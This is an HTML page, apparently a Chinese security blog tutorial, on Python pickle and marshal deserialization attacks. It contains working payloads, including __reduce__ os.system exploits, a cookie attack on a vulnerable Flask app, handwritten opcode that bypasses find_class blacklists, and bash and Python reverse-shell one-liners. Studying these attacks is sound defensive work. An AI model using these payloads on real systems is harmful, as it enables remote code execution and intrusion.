@@ -1,0 +1,836 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+
+
+
+
+
+<head>
+    <meta charset="utf-8" />
+    <link rel="apple-touch-icon" sizes="76x76" href="/favicon.ico">
+    <link rel="icon" type="image/png" href="/favicon.ico">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0, shrink-to-fit=no" name="viewport" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="description" content="One way to choose one">
+    <meta name="author" content="Misaki">
+    <meta name="keywords" content="">
+    <title>python 反序列化 ~ Misaki&#39;s Blog</title>
+    <link rel="stylesheet" href="/css/Material_Icons.css">
+    <!-- <link rel="stylesheet" href="/css/font-awesome.css"> -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/main.css">
+    
+        <link rel="stylesheet" href="/css/post.css">
+        
+            <link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
+        
+    
+</head>
+
+<body class=" sidebar-collapse">
+<nav class="navbar navbar-transparent navbar-color-on-scroll fixed-top navbar-expand-lg" color-on-scroll="100" id="sectionsNav">
+    <div class="container">
+        <div class="navbar-translate">
+            <a class="navbar-brand" href="/">
+                Misaki&#39;s Blog</a>
+            <button class="navbar-toggler" type="button" data-toggle="collapse" aria-expanded="false" aria-label="Toggle navigation">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="navbar-toggler-icon"></span>
+                <span class="navbar-toggler-icon"></span>
+                <span class="navbar-toggler-icon"></span>
+            </button>
+        </div>
+            <div class="collapse navbar-collapse">
+                <ul class="navbar-nav ml-auto">
+                    
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" href="/archives/">
+                                    archives
+                                </a>
+                            </li>
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" href="/about/">
+                                    about
+                                </a>
+                            </li>
+                        
+                    
+                    
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://github.com/MisakiKata" target="_blank" data-original-title="See me here">
+                                    <i class="fa fa-github"></i>
+                                </a>
+                            </li>
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://www.t00ls.net/members-profile-12179.html" target="_blank" data-original-title="See me here">
+                                    <i class="fa fa-twitch"></i>
+                                </a>
+                            </li>
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://misakikata.github.io/atom.xml" target="_blank" data-original-title="See me here">
+                                    <i class="fa fa-rss"></i>
+                                </a>
+                            </li>
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="mailto:misakikatas@gmail.com" target="_blank" data-original-title="See me here">
+                                    <i class="fa fa-envelope"></i>
+                                </a>
+                            </li>
+                        
+                    
+                </ul>
+            </div>
+    </div>
+</nav>
+    
+  <div class="page-header header-filter" data-parallax="true" style="background-image: url('/img/post-banner.jpg'); height: 70vh;">
+    
+      <div class="container">
+        <h1 class="title text-center post_title">python 反序列化</h1>
+        <p class="text-center"><b>Sunday, April 26th 2020, 3:11 pm</b></p>
+      </div>
+    
+  </div>
+
+  
+  
+  
+    <div class="row" style="margin: 0 0 0; z-index: 999;">
+  <div class="col-md-8 offset-md-1">
+    <div class="main main-raised">
+      <div class="container">
+        <div class="section">
+          <div class="post_content">
+              <h2 id="反序列化库"><a href="#反序列化库" class="headerlink" title="反序列化库"></a>反序列化库</h2><p>python 序列化和反序列化使用最为频繁的是<code>cPickle</code>和<code>pickle</code>，前者是C语言实现，据说速度比后者快很多。</p>
+<p>只不过python3标准库中不再叫<code>cPickle</code>，而是只有<code>pickle</code>。python2中两者都有。</p>
+<p>python2中的序列化文件如果想在python3中读取，需要修改编码。</p>
+<pre><code>#python2
+with open(&#39;mnist.pkl&#39;, &#39;rb&#39;) as f:
+    l = list(pickle.load(f))
+
+
+#python3
+with open(&#39;mnist.pkl&#39;, &#39;rb&#39;) as f:
+    u = pickle._Unpickler(f)
+    u.encoding = &#39;latin1&#39;
+    p = u.load()
+</code></pre><p>除此之外，还有一些其他的第三方序列化库，比如</p>
+<pre><code># marshmallow
+pip3 install marshmallow
+
+# MessagePack
+pip3 install msgpack-python
+</code></pre><h2 id="pickle反序列化"><a href="#pickle反序列化" class="headerlink" title="pickle反序列化"></a>pickle反序列化</h2><h3 id="pickle"><a href="#pickle" class="headerlink" title="pickle"></a>pickle</h3><p>问题是序列化为什么会产生漏洞，是序列化本身处理有问题，被外来的EXP攻击导致漏洞执行了嘛。因为<code>pickle</code>允许我们用数据表示任意对象。官方也在一开始就表述问题的严重性。</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200426165819294.png" alt="image-20200426165819294"></p>
+<p><code>pickle</code>允许任意对象通过定义<code>__reduce__</code>方法来声明它是如何被压缩的，一般来说这个方法是返回一个字符串或是一个元祖。</p>
+<pre><code>__reduce__
+被定义之后，当对象被Pickle时就会被调用
+要么返回一个代表全局名称的字符串，Pyhton会查找它并pickle，要么返回一个元组。这个元组包含2到5个元素，其中包括：一个可调用的对象，用于重建对象时调用；一个参数元素，供那个可调用对象使用
+
+__reduce_ex__
+首先查看是否存在__reduce_ex__,如果存在则不再查找__reduce__，不存在的话则继续查找__reduce__
+</code></pre><p>利用构造一个存在漏洞的简单代码：</p>
+<pre><code>#encoding: utf-8
+import os
+import pickle
+class test(object):
+    def __reduce__(self):
+        return (os.system,(&#39;whoami&#39;,))
+
+a=test()
+payload=pickle.dumps(a)
+print payload
+pickle.loads(payload)
+</code></pre><p>在python2和python3的输出为：</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200426171205336.png" alt="image-20200426171205336"></p>
+<p>其中代表的含义</p>
+<pre><code># \x80：协议头声明 \x03：协议版本
+# \x06\x00\x00\x00：数据长度：6  -&gt;  whoami
+# whoami：数据
+# q：储存栈顶的字符串长度：一个字节（即\x00）
+# \x00：栈顶位置
+# . ：数据截止
+# c：读取新的一行作为模块名module，读取下一行作为对象名object，nt -&gt;windows，posix -&gt; linux
+# (：将一个标记对象插入到堆栈中。
+# S: 实例化一个字符串对象
+# p：将堆栈中索引为-1的对应存储入内存。
+# t：构建元组压入堆栈。
+# R：将一个元组和一个可调用对象弹出堆栈，然后以该元组作为参数调用该可调用的对象，最后将结果压入到堆栈中。
+</code></pre><p>如果需要在web中请求传输，url编码后就可以发送了。</p>
+<p>如果使用的是<code>__reduce_ex__</code></p>
+<pre><code>#encoding: utf-8
+import os
+import pickle
+class test(object):
+    def __init__(self, cmd):
+        self.cmd = cmd
+    def __reduce_ex__(self,cmd):
+        return (os.system,(self.cmd,))
+
+a=test(&#39;whoami&#39;)
+payload=pickle.dumps(a)
+print(payload)
+pickle.loads(payload)
+</code></pre><p>其中<code>pickle.loads</code>是会解决import 问题，对于未引入的module会自动尝试import。那么也就是说整个python标准库的代码执行、命令执行函数我们都可以使用。有人整理的执行命令函数。</p>
+<pre><code>eval, execfile, compile, open, file, map, input,
+os.system, os.popen, os.popen2, os.popen3, os.popen4, os.open, os.pipe,
+os.listdir, os.access,
+os.execl, os.execle, os.execlp, os.execlpe, os.execv,
+os.execve, os.execvp, os.execvpe, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe,
+os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe,
+pickle.load, pickle.loads,cPickle.load,cPickle.loads,
+subprocess.call,subprocess.check_call,subprocess.check_output,subprocess.Popen,
+commands.getstatusoutput,commands.getoutput,commands.getstatus,
+glob.glob,
+linecache.getline,
+shutil.copyfileobj,shutil.copyfile,shutil.copy,shutil.copy2,shutil.move,shutil.make_archive,
+dircache.listdir,dircache.opendir,
+io.open,
+popen2.popen2,popen2.popen3,popen2.popen4,
+timeit.timeit,timeit.repeat,
+sys.call_tracing,
+code.interact,code.compile_command,codeop.compile_command,
+pty.spawn,
+posixfile.open,posixfile.fileopen,
+platform.popen
+</code></pre><p>以及不常用的命令执行函数</p>
+<pre><code>map(__import__(&#39;os&#39;).system,[&#39;bash -c &quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/12345 0&lt;&amp;1 2&gt;&amp;1&quot;&#39;,])
+
+sys.call_tracing(__import__(&#39;os&#39;).system,(&#39;bash -c &quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/12345 0&lt;&amp;1 2&gt;&amp;1&quot;&#39;,))
+
+platform.popen(&quot;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;127.0.0.1\&quot;,12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#39;&quot;)
+</code></pre><p>如果想手动编写opcode，可用查看<a href="https://xz.aliyun.com/t/7436#toc-11。文章详细介绍了pickle的原理和序列化值的含义。" target="_blank" rel="noopener">https://xz.aliyun.com/t/7436#toc-11。文章详细介绍了pickle的原理和序列化值的含义。</a></p>
+<p><code>pickle</code>库中针对序列化和反序列化的方法有</p>
+<pre><code>pickle.dump()   #传入一个文件句柄，以二进制的形式写入
+pickle.dumps()   #参数为字符串，返回一个序列化的byte对象
+pickle.load()   #同样是操作文件句柄，以二进制形式读取
+pickle.loads()   #直接从bytes对象中读取序列化值
+</code></pre><p>还有面向对象的反序列化类。这个类后面会被用到<code>pickle.Unpickler</code>。方法和上面一致操作文件。</p>
+<pre><code>f = open(fileName, &quot;rb&quot;)
+d = pickle.Unpickler(f)
+data = d.load()
+f.close()
+</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200427102136100.png" alt="image-20200427102136100"></p>
+<p>带有的方法为<code>&#39;find_class&#39;, &#39;load&#39;, &#39;memo&#39;, &#39;persistent_load&#39;</code></p>
+<p>面向对象的序列化类。<code>pickle.Pickler</code>，其中方法<code>&#39;bin&#39;, &#39;clear_memo&#39;, &#39;dispatch_table&#39;, &#39;dump&#39;, &#39;fast&#39;, &#39;memo&#39;, &#39;persistent_id&#39;</code></p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200427102434470.png" alt="image-20200427102434470"></p>
+<h3 id="pickle-payload"><a href="#pickle-payload" class="headerlink" title="pickle payload"></a>pickle payload</h3><p>上面都是提到的<code>pickle</code>的函数和序列化、反序列化的东西，现在用一个简单的场景来看一下payload。</p>
+<pre><code>import pickle
+import base64
+from flask import Flask, request
+
+app = Flask(__name__)
+
+@app.route(&quot;/&quot;)
+def index():
+    try:
+        user = base64.b64decode(request.cookies.get(&#39;user&#39;))
+        user = pickle.loads(user)
+        username = user[&quot;username&quot;]
+    except:
+        username = &quot;Guest&quot;
+
+    return &quot;Hello %s&quot; % username
+
+if __name__ == &quot;__main__&quot;:
+    app.run()
+</code></pre><p>当执行</p>
+<pre><code>&gt;&gt;&gt; class exp(object):
+...     def __reduce__(self):
+...             return (os.system,(&#39;whoami&#39;,))
+...
+&gt;&gt;&gt; e = exp()
+&gt;&gt;&gt; s = pickle.dumps(e)
+&gt;&gt;&gt; response = requests.get(&quot;http://127.0.0.1:5000/&quot;, cookies=dict(user=base64.b64encode(s).decode()))
+</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200427134049774.png" alt="image-20200427134049774"></p>
+<h3 id="Unpickler-find-class"><a href="#Unpickler-find-class" class="headerlink" title="Unpickler find_class()"></a>Unpickler find_class()</h3><p>当然对于这种无限制的任意对象调用，官方也有一定的解决办法，定制<code>find_class()</code>来控制要解封的对象。</p>
+<p><img src="python-反序列化.assets/image-20200427135200757.png" alt="image-20200427135200757"></p>
+<p>比如如下的一个例子：</p>
+<pre><code>import io
+import pickle
+
+safe_builtins = {   #白名单
+    &#39;range&#39;,
+    &#39;complex&#39;,
+    &#39;set&#39;,
+    &#39;frozenset&#39;,
+    &#39;slice&#39;,
+}
+
+class RestrictedUnpickler(pickle.Unpickler):
+
+    def find_class(self, module, name):
+        # Only allow safe classes from builtins.
+        if module == &quot;builtins&quot; and name in safe_builtins:   
+            return getattr(builtins, name)
+        # Forbid everything else.
+        raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; %
+                                     (module, name))
+
+def restricted_loads(s):
+    &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;
+    return RestrictedUnpickler(io.BytesIO(s)).load()   
+</code></pre><p>那么用这种方式来处理上面的漏洞代码</p>
+<pre><code>import pickle
+import io
+import builtins
+import base64
+from flask import Flask, request
+
+app = Flask(__name__)
+
+@app.route(&quot;/&quot;)
+def index():
+    try:
+        user = base64.b64decode(request.cookies.get(&#39;user&#39;))
+        user = pickle.loads(user)
+        username = user[&quot;username&quot;]
+    except:
+        username = &quot;Guest&quot;
+
+    return &quot;Hello %s&quot; % username
+
+
+@app.route(&quot;/user&quot;)
+def user():
+    try:
+        user = base64.b64decode(request.cookies.get(&#39;user&#39;))
+        user = restricted_loads(user)
+        username = user[&quot;username&quot;]
+    except:
+        username = &quot;Guest&quot;
+
+    return &quot;Hello %s&quot; % username
+
+
+class RestrictedUnpickler(pickle.Unpickler):
+    safe_list = {
+        &#39;range&#39;,
+        &#39;slice&#39;,
+        &#39;set&#39;
+    }
+    def find_class(self, module, name):
+        if module == &#39;builtins&#39; and name in safe_list:
+            return getattr(builtins, name)
+        raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; %(module, name))
+
+def restricted_loads(s):
+    return RestrictedUnpickler(io.BytesIO(s)).load()        
+
+
+if __name__ == &quot;__main__&quot;:
+    app.run()
+</code></pre><p>在<code>user</code>路径下，<code>os</code>模块的命令执行就不能使用了。准确的说只能考虑<code>builtins.*</code>的形式</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200427141531306.png" alt="image-20200427141531306"></p>
+<p>那么先来看一个这个函数是怎么调用的，查看文件</p>
+<p><a href="https://github.com/python/cpython/blob/9412f4d1ad28d48d8bb4725f05fd8f8d0daf8cd2/Lib/pickle.py" target="_blank" rel="noopener">https://github.com/python/cpython/blob/9412f4d1ad28d48d8bb4725f05fd8f8d0daf8cd2/Lib/pickle.py</a></p>
+<p>当读取到第一个字符c的时候，也就是模块名，调用的是<code>load_global</code>方法，查找此方法。</p>
+<pre><code>def load_global(self):
+        module = self.readline()[:-1].decode(&quot;utf-8&quot;)
+        name = self.readline()[:-1].decode(&quot;utf-8&quot;)
+        klass = self.find_class(module, name)
+        self.append(klass)
+    dispatch[GLOBAL[0]] = load_global
+</code></pre><p>把第一参数当作模块，第二个参数当作属性传入<code>find_class</code>中。而<code>find_class</code>：</p>
+<pre><code>def find_class(self, module, name):
+        # Subclasses may override this.
+        sys.audit(&#39;pickle.find_class&#39;, module, name)
+        if self.proto &lt; 3 and self.fix_imports:
+            if (module, name) in _compat_pickle.NAME_MAPPING:
+                module, name = _compat_pickle.NAME_MAPPING[(module, name)]
+            elif module in _compat_pickle.IMPORT_MAPPING:
+                module = _compat_pickle.IMPORT_MAPPING[module]
+        __import__(module, level=0)
+        if self.proto &gt;= 4:
+            return _getattribute(sys.modules[module], name)[0]
+        else:
+            return getattr(sys.modules[module], name)
+</code></pre><p>其中的代码看起来有点不好理解，其实就是表述官方的导入模块的限制，比如python2中写法</p>
+<pre><code> def find_class(self, module, name):
+        __import__(module)
+        mod = sys.modules[module]
+        klass = getattr(mod, name)
+        return klass
+</code></pre><p>看到<code>__import__</code>就大概可以理解，上面说的为啥<code>pickle</code>会自动解决导入的问题。那么这个怎么绕过呢，如果是按照官方给的例子，绕过的形式暂时没有发现。如果按照类似如下限制，<code>find_class</code>的限制仅仅是对该函数参数过滤，并没有hook <code>__import__</code>等函数，所以通过<code>eval(&#39;__import__(\&#39;xx\&#39;)&#39;)</code>等即可绕过。</p>
+<pre><code>import io
+import pickle
+
+safe_builtins = {   #白名单
+    &#39;range&#39;,
+    &#39;complex&#39;,
+    &#39;set&#39;,
+    &#39;frozenset&#39;,
+    &#39;slice&#39;,
+}
+
+class RestrictedUnpickler(pickle.Unpickler):
+
+    def find_class(self, module, name):
+        # Only allow safe classes from builtins.
+        if module == &quot;builtins&quot;:   
+            return getattr(builtins, name)
+        # Forbid everything else.
+        raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; %
+                                     (module, name))
+
+def restricted_loads(s):
+    &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;
+    return RestrictedUnpickler(io.BytesIO(s)).load()
+</code></pre><p>也就是必须在<code>builtins</code>模块下执行，那么其中哪些函数我们可以调用,python3</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200428111024908.png" alt="image-20200428111024908"></p>
+<pre><code>builtins.__getattribute__(&#39;eval&#39;),(&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;,)
+builtins.getattr(builtins, &#39;eval&#39;),(&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;,)
+</code></pre><p>是不是有点沙箱逃逸的感觉了，虽然并不一样。</p>
+<h3 id="new-classobj"><a href="#new-classobj" class="headerlink" title="new.classobj"></a>new.classobj</h3><p>python2中的旧式类型，python3中已经弃用，使用<code>type</code>来代替<code>classobj</code>。做用是创建一个新的类型对象。</p>
+<p>使用方法：</p>
+<pre><code>classobj(&#39;className&#39;,(baseClass,),{dictAttr:dictValue,...})
+
+from new import classobj
+myClass= classobj(&quot;HelloClass&quot;, (object, ), {&quot;name&quot;:&quot;boy&quot;, &quot;school&quot;:&quot;hn&quot;})
+</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200430093434147.png" alt="image-20200430093434147"></p>
+<p>看到类的名称并不是定义的<code>classobj</code>中的className参数。如果在python2下，如何利用这个模块来执行命令呢。</p>
+<pre><code>classobj(&#39;system&#39;, (), {&#39;__getinitargs__&#39;:lambda self,arg=(&#39;whoami&#39;,):arg, &#39;__module__&#39;: &#39;os&#39;})
+</code></pre><p>构造一条完整的命令</p>
+<pre><code>payload2 = pickle.dumps(classobj(&#39;system&#39;, (), {&#39;__getinitargs__&#39;:lambda self,arg=(&#39;whoami&#39;,):arg, &#39;__module__&#39;: &#39;os&#39;})())
+pickle.loads(payload2)
+</code></pre><h3 id="手写opcode"><a href="#手写opcode" class="headerlink" title="手写opcode"></a>手写opcode</h3><p>没有看上面提到的那个文章的，可以先看看这一篇<a href="https://xz.aliyun.com/t/7012。主要介绍了在python2下的构造，下面主要使用python3，不过仍然可以参考。opcode版本向下兼容，所以要是了解0版本的opcode，也可以在python3中使用。" target="_blank" rel="noopener">https://xz.aliyun.com/t/7012。主要介绍了在python2下的构造，下面主要使用python3，不过仍然可以参考。opcode版本向下兼容，所以要是了解0版本的opcode，也可以在python3中使用。</a></p>
+<p>python3中的opcode：<a href="https://github.com/python/cpython/blob/3.8/Lib/pickle.py" target="_blank" rel="noopener">https://github.com/python/cpython/blob/3.8/Lib/pickle.py</a></p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200428142817753.png" alt="image-20200428142817753"></p>
+<p>为啥需要手写opcode，假设我们想执行如下命令，在内建函数中引用形式如下，如果有一个黑名单禁用<code>eval</code>，那么利用<code>__reduce__</code>就不能使用了。</p>
+<pre><code>builtins.getattr(builtins, &#39;eval&#39;),(&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;,)
+</code></pre><p>但是在<code>__reduce__</code>生成的序列化字符串，只能执行一个函数，而且在对open传参的过程中，程序会报错。</p>
+<p>不能正常生成序列化字符串，这就需要手写一个序列化字符串。</p>
+<p>在这之前，先看一个简单的opcode是如何构造的。利用<code>pickletools</code>来查看，先利用上面的一串利用脚本</p>
+<pre><code>import pickletools
+class exp(object):
+    def __reduce__(self):
+        return (os.system,(&#39;whoami&#39;,))
+
+e = exp()
+s = pickle.dumps(e)
+pickletools.dis(s)
+</code></pre><p>在python3下生成结果为：</p>
+<pre><code>b&#39;\x80\x03cnt\nsystem\nq\x00X\x06\x00\x00\x00whoamiq\x01\x85q\x02Rq\x03.&#39;
+</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200428140432397.png" alt="image-20200428140432397"></p>
+<pre><code>   0: \x80 PROTO      3            #协议版本            
+    2: c    GLOBAL     &#39;nt system&#39;  #把nt.system对象压栈                 os.system
+   13: q    BINPUT     0            #把对象存储到memo的第0个位置                ...
+   15: X    BINUNICODE &#39;whoami&#39;     #压入一个utf-8的元素参数               &#39;whoami&#39;
+   26: q    BINPUT     1            #存储到memo的第1个位置                     ...
+   28: \x85 TUPLE1                  #将前面的元素参数弹出，组成元组再压栈     (&#39;whoami&#39;,)
+   29: q    BINPUT     2            #将上面的元组存储到memo的第2个位置           ...
+   31: R    REDUCE                  #将对象和元组组合执行，结果压栈          os.system(&#39;whoami&#39;)
+   32: q    BINPUT     3            #存储到memo的第3个位置上                    ...
+   34: .    STOP                    #停止
+</code></pre><p>跟python2的对比一下</p>
+<pre><code>cnt                   
+system                
+p0                    
+(S&#39;whoami&#39;            
+p1                    
+tp2                   
+Rp3                   
+.                     
+</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200428142904682.png" alt="image-20200428142904682"></p>
+<pre><code>    0: c    GLOBAL     &#39;nt system&#39;               #压入对象
+   11: p    PUT        0                         #存储到memo的0位置
+   14: (    MARK                                 #压入一个MARK
+   15: S        STRING     &#39;whoami&#39;              #压入一个字符串
+   25: p        PUT        1                     #存储到memo的1位置
+   28: t        TUPLE      (MARK at 14)          #组合参数成元组，相当于一个右括号
+   29: p    PUT        2                         #存储到memo的第2位置
+   32: R    REDUCE                               #组合对象和元素，结果压栈
+   33: p    PUT        3                         #结果存储到memo的第3位置
+   36: .    STOP                                 #停止
+</code></pre><p>其中的memo是可以去除的，可以进一步省略为</p>
+<pre><code>cnt                   
+system                                   
+(S&#39;whoami&#39;                        
+tR.   
+</code></pre><p>从显示上看，明显是0版本更为好构造，既然如此，就用0版本来手写一个</p>
+<pre><code>builtins.getattr(builtins, &#39;eval&#39;),(&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;,)
+</code></pre><p>首先保证模块和调用函数</p>
+<pre><code>cbuiltins
+getattr
+</code></pre><p>把参数压入，不过其中有个问题，上面压入参数的时候都是字符串，其中却有个对象，如果直接压入明显是报错，要是使用<code>c</code>来导入模块，下面还需要接一个实例，所以这里并不能直接压入单一的对象。也就是需要从某个模块中调用到<code>builtins</code>，例如无限套娃：</p>
+<pre><code>&gt;&gt;&gt; builtins.__dict__.get(&#39;globals&#39;)().get(&#39;__builtins__&#39;)
+&lt;module &#39;__builtins__&#39; (built-in)&gt;
+</code></pre><p>但是这里来回连续调用好几次函数，看起来也不好弄，跟上面联合分开查看</p>
+<pre><code>get = builtins.getattr(builtins.__dict__, &#39;get&#39;)
+builtins = get(&#39;globals&#39;)().get(&#39;__builtins__&#39;)
+</code></pre><p>只不过到此犯了一个错误，过于依赖其中的魔法函数，导致忘记<code>builtins</code>本身就可以直接调用<code>globals</code>。行吧。。。</p>
+<pre><code>builtins = builtins.globals().get(&#39;builtins&#39;)
+</code></pre><p>那这里就分块来构造。</p>
+<pre><code>cbuiltins
+globals             #builtins.globals
+</code></pre><p>那么后面调用get函数，这里知道<code>globals</code>获取的实际是一个<code>dict</code>属性对象。如果想使用<code>get</code>，当然也不能直接用，又要先去获取<code>get</code>。</p>
+<pre><code>cbuiltins
+getattr
+(cbuiltins
+dict
+S&#39;get&#39;
+tR.             #builtins.dict.get -&gt; &lt;method &#39;get&#39; of &#39;dict&#39; objects&gt;
+</code></pre><p>再把获取到的<code>get</code>跟上面的函数撮合一下，这里<code>get</code>放在上面，虽说是调用<code>get</code>属性来处理，但是也是在获取到全局属性后，利用<code>get</code>来进行的筛选</p>
+<pre><code>cbuiltins
+getattr
+(cbuiltins
+dict
+S&#39;get&#39;
+tR(cbuiltins
+globals
+(tRS&#39;builtins&#39;
+tR.
+</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200429143946265.png" alt="image-20200429143946265"></p>
+<p>记得R后要有跟的后续参数或对象，我也没明白为啥，反正没有就会报错，踩这个坑踩了N久。获取到<code>builtins</code>，再去获取其中的函数。</p>
+<pre><code>cbuiltins
+getattr
+(....                #上文获取到的builtins
+S&#39;eval&#39;
+tRp1
+(S&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;
+tR.
+</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200429144538320.png" alt="image-20200429144538320"></p>
+<p>在某一个黑名单的过滤中，就可以使用此来绕过，在这种黑名单中<code>__reduce__</code>是会先把<code>builtins.getattr(builtins,&#39;eval&#39;)</code>解释为<code>builtins.eval</code>导致被拦截。</p>
+<pre><code>#coding:utf-8
+import io
+import pickle
+import builtins
+import os
+
+blacklist = {
+    &#39;eval&#39;,
+    &#39;exec&#39;
+}
+
+class RestrictedUnpickler(pickle.Unpickler):
+
+    def find_class(self, module, name):
+        # Only allow safe classes from builtins.
+        if module == &quot;builtins&quot; and name not in blacklist:
+            return getattr(builtins, name)
+        # Forbid everything else.
+        raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; %
+                                     (module, name))
+
+def restricted_loads(s):
+    &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;
+    return RestrictedUnpickler(io.BytesIO(s)).load()
+
+
+class exp(object):
+    def __reduce__(self):
+        return (builtins.getattr(builtins,&#39;eval&#39;),(&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;,))
+
+# e = exp()
+# s = pickle.dumps(e)
+s = b&quot;&quot;&quot;cbuiltins
+getattr
+(cbuiltins
+getattr
+(cbuiltins
+dict
+S&#39;get&#39;
+tR(cbuiltins
+globals
+(tRS&#39;builtins&#39;
+tRS&#39;eval&#39;
+tRp1
+(S&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;
+tR.&quot;&quot;&quot;
+
+restricted_loads(s)
+</code></pre><p>到此为了对了黑名单过滤的方法已经取得了部分胜利，opcode不止这些还有很多没用到。</p>
+<p>执行函数的并不只是R，还有O和I，都是小写，比如获取<code>get</code>。</p>
+<pre><code>#使用o，使用第一个参数作为函数，第二到n个元素作为参数
+b&quot;&quot;&quot;(cbuiltins
+getattr
+cbuiltins
+dict
+S&#39;get&#39;
+o.&quot;&quot;&quot;
+
+#使用i,先获取全局函数，在计算mark之后的数据组合为元组作为参数
+b&quot;&quot;&quot;(cbuiltins
+dict
+S&#39;get&#39;
+ibuiltins
+getattr
+.&quot;&quot;&quot;
+</code></pre><p>如果不想什么都去手写，或者也不是很熟练，可以参考</p>
+<p><a href="https://github.com/sensepost/anapickle/blob/master/anapickle.py" target="_blank" rel="noopener">https://github.com/sensepost/anapickle/blob/master/anapickle.py</a></p>
+<p>其中列出来不少完善的opcode，只需要按照提示修改其中的关键词，就可以使用，只不过这个脚本是利用python2，其中有些函数已经在python3下取消了，需要查看修改。</p>
+<h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><h3 id="Marshal"><a href="#Marshal" class="headerlink" title="Marshal"></a>Marshal</h3><p>上面扯了半天的<code>pickle</code>，那么现在看看还有啥别的序列化库吧。由于<code>pickle</code>不能序列化code对象，所以在python2.6后新增<code>marshal</code>来处理code对象的序列化。</p>
+<pre><code>#coding:utf-8
+import pickle,builtins,pickletools,base64
+import marshal
+import urllib
+
+def foo():
+    import os
+    def fib(n):
+        if n &lt;= 2:
+            return n
+        return fib(n-1) + fib(n-2)
+    print (fib(5))
+
+try:
+    pickle.dumps(foo.__code__)
+except Exception as e:
+    print(e)
+
+code_serialized = base64.b64encode(marshal.dumps(foo.__code__))
+print (code_serialized)
+</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200429162508587.png" alt="image-20200429162508587"></p>
+<p>如何去反序列化并且执行函数。</p>
+<pre><code>code_unserialized = marshal.loads(base64.b64decode(code_serialized))
+print(code_unserialized)
+
+&lt;code object foo at 0x000001E232E27AE0, file &quot;E:/poc.py&quot;, line 7&gt;
+</code></pre><pre><code>code_unserialized = types.FunctionType(code_unserialized, globals(), &#39;&#39;)()
+print(code_unserialized)
+
+8
+None
+</code></pre><p>这样就可以之间获取一个opcode。</p>
+<pre><code>ctypes
+FunctionType
+(cmarshal
+loads
+(cbase64
+b64decode
+(S&#39;YwAAA...&#39;           #code对象序列化编码
+tRtRc__builtin__
+globals
+(tRS&#39;&#39;
+tR(tR.
+</code></pre><p>组合脚本</p>
+<pre><code>import marshal
+import base64
+
+def foo():
+
+    pass # Your code here
+
+print &quot;&quot;&quot;ctypes
+FunctionType
+(cmarshal
+loads
+(cbase64
+b64decode
+(S&#39;%s&#39;
+tRtRc__builtin__
+globals
+(tRS&#39;&#39;
+tR(tR.&quot;&quot;&quot; % base64.b64encode(marshal.dumps(foo.func_code))
+</code></pre><p>利用上面的序列化在<code>pickle</code>下尝试执行，调用os模块来执行其中的函数。</p>
+<pre><code>def foo():
+    import os
+    return os.system(&#39;whoami&#39;)
+
+code_serialized = base64.b64encode(marshal.dumps(foo()))
+print (code_serialized)
+
+payload = b&quot;&quot;&quot;ctypes
+FunctionType
+(cmarshal
+loads
+(cbase64
+b64decode
+(S&#39;6QAAAAA=&#39;   #whomai
